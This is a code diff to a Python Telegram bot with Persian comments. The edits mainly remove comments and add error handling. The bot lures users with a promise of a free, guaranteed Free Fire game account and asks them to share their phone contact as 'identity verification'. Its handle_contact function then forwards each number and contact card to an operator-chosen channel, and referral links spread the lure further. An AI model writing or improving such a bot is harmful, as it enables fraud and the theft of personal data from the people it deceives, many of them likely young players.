@@ -11,9 +11,9 @@ from telegram.ext import (
     filters,
     ConversationHandler,
 )
-from telegram.error import TelegramError
+from telegram.error import TelegramError, NetworkError, Conflict
 
-# تنظیمات لوگ برای بررسی خطاها
+# تنظیمات لوگ
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
@@ -25,8 +25,8 @@ ADMIN_ID = 6749949992
 
 # دیتابیس ساده در حافظه
 db = {
-    "target_channel": None,  # آیدی یا یوزرنیم چنل مقصد
-    "users": {}  # user_id: {"referrals": count, "invited_by": id, "phone": str}
+    "target_channel": None,
+    "users": {}
 }
 
 WAITING_FOR_CHANNEL = 1
@@ -39,7 +39,6 @@ class HealthCheckHandler(BaseHTTPRequestHandler):
         self.wfile.write(b"OK - Bot is running")
 
     def log_message(self, format, *args):
-        # غیرفعال کردن لوگ‌های مداوم پینگ رندر
         return
 
 def run_health_check_server():
@@ -70,7 +69,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_data = get_user_data(user.id)
     
-    # بررسی لینک رفرال
     if context.args and not user_data["invited_by"]:
         try:
             referrer_id = int(context.args[0])
@@ -89,7 +87,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except ValueError:
             pass
 
-    # درخواست تایید هویت در صورت عدم ثبت شماره
     if not user_data["phone"]:
         contact_keyboard = ReplyKeyboardMarkup(
             [[KeyboardButton("تایید هویت 🚀", request_contact=True)]],
@@ -107,7 +104,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # پیام خوش‌آمدگویی پس از تایید
     await update.message.reply_text(
         f"سلام {user.first_name} عزیز! 🎯\n\n"
         "به ربات دریافت اکانت رایگان و تضمینی فری فایر خوش آمدید.\n"
@@ -126,7 +122,6 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_data = get_user_data(user.id)
     user_data["phone"] = contact.phone_number
 
-    # فوروارد مخاطب به چنل مقصد
     target_channel = db["target_channel"]
     if target_channel:
         try:
@@ -139,7 +134,6 @@ async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             await context.bot.send_message(chat_id=target_channel, text=log_text, parse_mode="Markdown")
             
-            # فوروارد کنتاکت
             await context.bot.forward_message(
                 chat_id=target_channel,
                 from_chat_id=update.effective_chat.id,
@@ -263,9 +257,11 @@ async def cancel_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("عملیات لغو شد.")
     return ConversationHandler.END
 
+async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
+    logging.error(f"Exception while handling an update: {context.error}")
+
 # ----------------- MAIN FUNCTION -----------------
 def main():
-    # شروع وب‌سرور در یک Thread جداگانه برای پاس کردن Health Check رندر
     threading.Thread(target=run_health_check_server, daemon=True).start()
 
     app = ApplicationBuilder().token(TOKEN).build()
@@ -284,9 +280,10 @@ def main():
     app.add_handler(MessageHandler(filters.Regex("^👤 حساب کاربری$"), account_info))
     app.add_handler(MessageHandler(filters.Regex("^🔗 لینک رفرال$"), referral_link))
     app.add_handler(MessageHandler(filters.Regex("^🎁 دریافت اکانت$"), claim_account))
+    app.add_error_handler(error_handler)
 
     print("Bot is running...")
-    app.run_polling()
+    app.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
     main()
